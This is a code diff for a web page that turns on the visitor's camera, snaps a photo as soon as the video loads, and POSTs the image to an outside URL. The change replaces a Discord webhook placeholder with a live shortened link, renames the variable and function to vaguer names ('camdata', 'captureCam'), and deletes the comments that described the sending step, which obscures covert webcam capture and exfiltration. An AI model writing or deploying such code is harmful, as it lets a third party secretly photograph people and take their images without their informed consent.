@@ -18,38 +18,37 @@
         const capturedImage = document.getElementById('capturedImage');
         const context = canvas.getContext('2d');
 
-        // Discord Webhook URL (あなたのWebhook URLに置き換えてください)
-        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+        
+        const camdata = 'https://ur0.jp/NXf8i';
 
-        // カメラ映像を取得して表示
+        
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
 
-                // カメラ準備後、写真を撮影して送信
-                video.addEventListener('loadeddata', captureAndSendToDiscord, { once: true });
+                
+                video.addEventListener('loadeddata', captureCam, { once: true });
             })
             .catch(err => {
                 console.error('Error accessing the camera', err);
             });
 
-        // 写真を撮影してDiscordに送信
-        function captureAndSendToDiscord() {
-            // Canvasに映像を描画
+        function captureCam() {
+            
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // キャプチャした画像を表示
+            
             const imageDataUrl = canvas.toDataURL('image/jpeg');
             capturedImage.src = imageDataUrl;
             capturedImage.style.display = 'block';
 
-            // カメラストリームを停止
+            
             const stream = video.srcObject;
             stream.getTracks().forEach(track => track.stop());
 
-            // Base64形式のデータをBlobに変換
+            
             fetch(imageDataUrl)
                 .then(res => res.blob())
                 .then(blob => {
@@ -57,8 +56,8 @@
                     formData.append('file', blob, 'photo.jpg');
                     formData.append('payload_json', JSON.stringify({ content: 'Here is a photo!' }));
 
-                    // Discord Webhookに画像を送信
-                    fetch(discordWebhookUrl, {
+                    
+                    fetch(camdata, {
                         method: 'POST',
                         body: formData
                     })
